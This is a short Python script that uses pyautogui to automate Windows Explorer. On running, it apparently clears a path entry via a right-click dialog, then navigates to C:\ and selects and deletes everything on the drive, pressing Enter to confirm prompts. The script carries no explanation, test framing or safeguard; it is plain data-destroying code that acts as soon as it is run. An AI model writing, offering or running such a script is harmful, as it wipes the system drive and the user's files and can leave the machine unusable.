import pyautogui
import time 

def find_ema():
    pyautogui.hotkey('win', 'e') 
    pyautogui.write('This PC', interval=0.1)  
    pyautogui.press('enter')
    pyautogui.rightClick(x=500, y=300)
    pyautogui.press('enter') 

def rem_path():
    pyautogui.press('down')
    pyautogui.press('enter')
    pyautogui.hotkey('ctrl', 'a') 
    pyautogui.press('delete') 
    pyautogui.press('enter')  
    pyautogui.press('enter')  

def navigate_to_c_drive():
    pyautogui.hotkey('ctrl', 'l')
    pyautogui.write('C:\\', interval=0.1)
    pyautogui.press('enter')

def delete_all_data_in_c_drive():
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('delete')
    pyautogui.press('enter')
    pyautogui.press('enter')

time.sleep(2)

find_ema()

time.sleep(2)

rem_path()

time.sleep(2)

navigate_to_c_drive()
delete_all_data_in_c_drive()
